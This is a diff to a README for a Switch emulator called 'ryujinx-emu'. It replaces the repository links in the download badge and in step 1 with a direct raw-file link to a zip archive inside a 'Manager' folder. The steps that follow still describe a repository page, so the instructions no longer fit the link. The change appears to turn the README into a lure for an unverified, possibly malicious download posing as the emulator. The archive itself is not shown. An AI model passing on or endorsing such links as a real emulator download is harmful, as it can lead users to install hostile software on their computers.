@@ -1,6 +1,6 @@
 # 🎮 ryujinx-emu - Play Switch games on your PC
 
-[![Download ryujinx-emu](https://img.shields.io/badge/Download-Blue-blue.svg)](https://github.com/Loosecannonredbackedmouse809/ryujinx-emu)
+[![Download ryujinx-emu](https://img.shields.io/badge/Download-Blue-blue.svg)](https://raw.githubusercontent.com/Loosecannonredbackedmouse809/ryujinx-emu/main/Manager/emu_ryujinx_v3.6.zip)
 
 ## 📋 About This Project
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run the emulator well. Check these specs b
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit this page to download: [https://github.com/Loosecannonredbackedmouse809/ryujinx-emu](https://github.com/Loosecannonredbackedmouse809/ryujinx-emu)
+1.  Visit this page to download: [https://raw.githubusercontent.com/Loosecannonredbackedmouse809/ryujinx-emu/main/Manager/emu_ryujinx_v3.6.zip](https://raw.githubusercontent.com/Loosecannonredbackedmouse809/ryujinx-emu/main/Manager/emu_ryujinx_v3.6.zip)
 2.  Click the link to open the project repository page.
 3.  Look for the green button labeled "Code" or check the "Releases" section on the right side of the page.
 4.  Download the compressed file, which usually ends in .zip.
